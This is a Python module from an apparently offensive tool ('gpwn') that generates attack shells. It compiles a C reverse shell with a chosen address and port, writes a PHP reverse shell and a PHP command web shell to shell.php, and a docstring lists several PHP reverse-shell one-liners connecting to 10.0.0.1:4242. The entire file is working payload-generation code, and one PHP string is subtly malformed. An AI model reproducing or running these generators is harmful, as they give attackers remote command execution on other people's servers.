import os
import logging
from subprocess import Popen, PIPE, check_output

from gpwn.resources import get_path
from gpwn.exceptions import ShellError

logger = logging.getLogger().getChild(__name__)


class Shell:
    def __init__(self, address: str, port: int):
        self.address = address
        self.port = port

    def generate_reverse_shell(self):
        logger.error("reverse shell not implemented")

    def generate_bind_shell(self):
        logger.error("bind shell not implemented")

    def generate_cmd_shell(self):
        logger.error("cmd shell not implemented")


class C(Shell):
    def __init__(self, address: str, port: int, shell: str):
        Shell.__init__(self, address=address, port=port)
        self.shell = shell

    def generate_reverse_shell(self):
        self.validate()

        shell = "\"%s\"" % self.shell
        port = self.port
        address = "\"%s\"" % self.address
        path = os.path.join(get_path(), 'shell.c')
        logger.debug("compiling: %s -DREMOTE_ADDR=%s -DREMOTE_PORT=%s -DSHELL=%s", path, address, port, shell)
        pipe = Popen(
            ["gcc", path, "-o", "shell", "-DREMOTE_ADDR=%s" % address, "-DREMOTE_PORT=%s" % port, "-DSHELL=%s" % shell,
             "-Wno-implicit-function-declaration"])
        logger.info("created reverse shell")

    def validate(self):
        if self.address is None:
            raise ShellError('Missing or invalid address')
        if self.port is None:
            raise ShellError('Missing or invalid port')


class Php(Shell):
    def __init__(self, address: str, port: int, shell: str):
        Shell.__init__(self, address=address, port=port)
        self.shell = shell

        '''
            Variants:
            
            php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
            php -r '$sock=fsockopen("10.0.0.1",4242);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
            php -r '$sock=fsockopen("10.0.0.1",4242);`/bin/sh -i <&3 >&3 2>&3`;'
            php -r '$sock=fsockopen("10.0.0.1",4242);system("/bin/sh -i <&3 >&3 2>&3");'
            php -r '$sock=fsockopen("10.0.0.1",4242);passthru("/bin/sh -i <&3 >&3 2>&3");'
            php -r '$sock=fsockopen("10.0.0.1",4242);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
            php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
        '''

    def generate_reverse_shell(self):
        shell = "<?php $sock=fsockopen(\"%s\",%s);exec(\"%s -i <&3 >&3 2>&3\");>" % (self.address, self.port, self.shell)
        with open('shell.php', 'w') as file:
            file.write(shell)

        logger.info("created shell.php")

    def generate_cmd_shell(self):
        shell = "<?php system($_GET['cmd']);?>"
        with open('shell.php', 'w') as file:
            file.write(shell)
        logger.info("created shell.php")
